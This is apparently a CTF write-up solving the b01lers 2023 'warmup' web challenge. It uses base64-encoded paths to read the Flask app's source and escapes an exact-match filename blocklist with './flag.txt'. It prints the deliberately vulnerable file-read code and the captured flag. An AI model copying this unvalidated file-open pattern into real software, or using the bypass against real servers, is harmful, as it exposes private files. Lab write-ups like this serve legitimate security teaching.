---
layout: default
ctf: "b01lers 2023"
title: "warmup"
description: "Just a My first flask app, I hope you like it"
date: 2023-03-18
category: "Web"
points: 100
solves: 176
tags: ["web", "base64", "file disclosure"]
author: ["quby"]
---

# Warmup (100pts, 176 solved)

My first flask app, I hope you like it

[http://ctf.b01lers.com:5115](http://ctf.b01lers.com:5115/)

Author: CygnusX

## Solution

Navigate on website, you will be redirected in `http://ctf.b01lers.com:5115/aW5kZXguaHRtbA==`

Url's path is obviously base64 encoded


```bash
!echo -n "aW5kZXguaHRtbA==" | base64 -d
```

    index.html

Anaylyzing index.html source code:

```html
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My first flask app</title>
</head>
<body>
    <h1>Hello World!</h1>
</body>
<script>
    console.log("")
</script>
<!-- debug.html -->
</html>
```

We can see that there is a debug.html file:



```bash
!echo -n "debug.html" | base64 
```

    ZGVidWcuaHRtbA==


**NOTE: -n is used to avoid new line**

So we can try to navigate to `http://ctf.b01lers.com:5115/ZGVidWcuaHRtbA==`

It shows us the following text:

`testing rendering for flask app.py`

So we need to go deeper, and try to navigate in app.py


```bash
!echo -n "app.py" | base64 
```

    YXBwLnB5


Navigate to `http://ctf.b01lers.com:5115/YXBwLnB5`, we found website source code:

```python
from base64 import b64decode
import flask

app = flask.Flask(__name__)

@app.route('/<name>')
def index2(name):
    name = b64decode(name)
    if (validate(name)):
        return "This file is blocked!"
    try:
        file = open(name, 'r').read()
    except:
        return "File Not Found"
    return file

@app.route('/')
def index():
    return flask.redirect('/aW5kZXguaHRtbA==')

def validate(data):
    if data == b'flag.txt':
        return True
    return False


if __name__ == '__main__':
    app.run()
```

In order to get the flag, we need to find a way to bypass the validate function.

We can see that the validate function checks if the file is `flag.txt`, so we can try to use `./flag.txt` to bypass the check.


```bash
!echo -n "./flag.txt" | base64
```

   Li9mbGFnLnR4dA==


Navigate to http://ctf.b01lers.com:5115/Li9mbGFnLnR4dA==, we get the flag:

`bctf{h4d_fun_w1th_my_l4st_m1nut3_w4rmuP????!}`
